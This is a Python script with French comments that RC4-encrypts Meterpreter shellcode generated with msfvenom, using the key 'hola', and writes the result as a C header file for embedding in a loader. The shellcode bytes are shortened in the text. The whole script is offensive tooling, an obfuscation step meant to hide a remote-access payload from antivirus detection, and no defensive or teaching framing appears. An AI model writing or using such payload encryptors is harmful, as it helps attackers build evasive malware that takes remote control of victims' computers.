# Importation du module Path pour gérer les chemins des fichiers
from pathlib import Path

# Clé RC4 utilisée pour chiffrer le payload (en bytes)
rc4_key = b"hola"

# Fonction pour chiffrer/déchiffrer des données avec l'algorithme RC4
def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    # Initialisation du tableau S-box
    S = list(range(256))
    j = 0
    # Phase de mélange basée sur la clé (Key Scheduling Algorithm - KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    # Génération du flux pseudo-aléatoire (Pseudo Random Generation Algorithm - PRGA)
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])  # XOR avec le flux généré
    return bytes(out)

# Fonction qui génère un fichier header en C contenant le payload chiffré
def generate_header(data: bytes, name: str = "payload") -> str:
    # Formatage du payload en hexadécimal dans une chaîne pour le header C
    content = ', '.join(f"0x{b:02x}" for b in data)
    # Renvoie une chaîne formatée compatible avec un fichier header C
    return f"unsigned char {name}[] = {{ {content} }};\nunsigned int {name}_len = {len(data)};\n"

# Shellcode généré via msfvenom (payload Meterpreter)
shellcode = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x48"
    b"\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x51"
    # ... (shellcode raccourci ici pour lisibilité) ...
    b"\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
)

# Chiffrement du shellcode avec RC4 et la clé spécifiée
encrypted = rc4_encrypt(shellcode, rc4_key)

# Génération du fichier header en C avec le shellcode chiffré
header = generate_header(encrypted)

# Sauvegarde du fichier header en C dans "encrypted_payload.h"
with open("encrypted_payload.h", "w") as f:
    f.write(header)

# Confirmation à l'utilisateur que le header a été sauvegardé
print("Header saved to encrypted_payload.h")

